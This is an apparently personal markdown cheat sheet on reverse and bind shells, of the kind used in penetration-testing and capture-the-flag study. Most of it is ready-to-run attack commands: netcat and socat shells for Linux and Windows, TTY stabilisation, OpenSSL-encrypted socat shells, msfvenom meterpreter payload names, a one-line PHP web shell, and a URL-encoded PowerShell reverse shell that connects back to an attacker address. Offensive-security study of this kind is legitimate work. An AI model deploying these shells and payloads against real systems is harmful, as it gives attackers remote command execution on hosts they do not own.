# Reverse/Bind shells
Both techniques involve getting access to the CLI of a target.

**Reverse** - target reaches to us
**Bind** - target opens a port for us to connect

Let's get to the fun part.

> NOTE - to use a port below 1024, `sudo` is required.

## Netcat
This is by far the easiest tool to set up a reverse shell. Be careful, though - it isn't pretty stable.

*<u>Reverse shells</u>*

Set up a listener: `sudo nc -lvnp 443`

And connect to it as the target: `nc 13.13.13.13 443`

*<u>Bind shells</u>*

Syntax is the same; just the target is listening, and an attacker connects to it; nothing complicated.

### Netcat stabilization
#### Python
Full technique:
1. `python -c 'import pty;pty.spawn("/bin/bash")'` - on the target, spawn a better shell
2. `export TERM=xterm` - gives access to term commands
3. BG with CTRL + Z and in our terminal `stty raw -echo; fg`

#### rlwrap
Just a wrapper, but useful with Windows: `rlwrap nc -lvnp 443`

## Socat
Much more powerful, but harder.

*<u>Reverse shells</u>*

Listener: `sudo socat TCP-L:<port> -`

Connecting back:
- Linux - `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"`
- Windows - `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes`

*<u>Bind shells</u>*

Listener:
- Linux - `socat TCP-L:<PORT> EXEC:"bash -li"`
- Windows - `socat TCP-L:<PORT> EXEC:powershell.exe,pipes`

Connect with: `socat TCP:<TARGET-IP>:<TARGET-PORT> -`

### Fully stable tty reverse shell - only Linux
Some neat tricks - not going to explain them, though:

Listener: `socat TCP-L:<port> FILE:`tty`,raw,echo=0`<br>
Connect with: `socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane`

### Encrypted Shells
Socat gives us the option to encrypt our shell with RSA.

Setup on attacker side:
```sh
# Generate a certificate
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt

# Merge into .pem
cat shell.key shell.crt > shell.pem
```

Now with our certificate:
1. Listener: `socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -`
2. Connect back: `socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash`

> **NOTE** `verify=0` means not to validate certificate

As for a bind shell, this one with a Windows machine:
1. Listener: `socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`
2. Connecting to: `socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -`

`shell.pem` must be present; transfer it to the target.

## Common payloads
Refer to the [Reverse Shell Cheat Sheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/)

## msfvenom
Refer to [Metasploit](metasploit.md). Used primarily for the meterpreter shell, msfvenom generates a reverse/bind shell for a given platform.

Staged ones are in meterpreter folder; otherwise stageless.

Main ones:
- `windows/x64/meterpreter/reverse_tcp`
- `windows/x64/meterpreter_reverse_tcp`
- `linux/x86/meterpreter/reverse_tcp`
- `linux/x86/meterpreter_reverse_tcp`

The same goes for bind shells. Catch meterpreter with the `multi/handler` module from Metasploit. It's an agent in between your system and target's one. Refer to [Metasploit](metasploit.md).

## WebShells
A script that runs code inside a web server (usually PHP; this one will be covered). A very basic one:<br>
`<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>`

URL with `?cmd=` parameter executes a command and outputs it. Encode your sexy Powershell Reverse shell and paste it here. E.g.<br>
`powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22`

But refer to the [Reverse Shell Cheat Sheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/)!!